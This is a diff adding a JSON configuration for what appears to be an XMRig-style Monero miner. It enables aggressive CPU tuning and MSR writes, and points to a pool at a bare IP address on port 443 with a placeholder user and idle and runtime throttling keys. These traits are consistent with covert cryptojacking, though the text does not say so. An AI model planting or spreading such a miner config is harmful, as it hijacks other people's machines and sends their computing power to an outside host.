@@ -1,0 +1,38 @@
+{
+    "autosave": true,
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "huge-pages-jit": true,
+        "hw-aes": null,
+        "priority": null,
+        "memory-pool": true,
+        "yield": true,
+        "1gb-pages": true
+    },
+    "pools": [
+        {
+            "url": "64.235.43.43:443",
+            "user": "1",
+            "pass": "x",
+            "tls": true,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "algo": null
+        }
+    ],
+    "randomx": {
+        "init": -1,
+        "mode": "fast",
+        "1gb-pages": true,
+        "rdmsr": true,
+        "wrmsr": true,
+        "cache_qos": false,
+        "v2": true
+    },
+    "user-agent": null,
+    "donate-level": 1,
+    "donate-over-proxy": 1,
+    "runtime": 40,
+    "idle": 10
+}
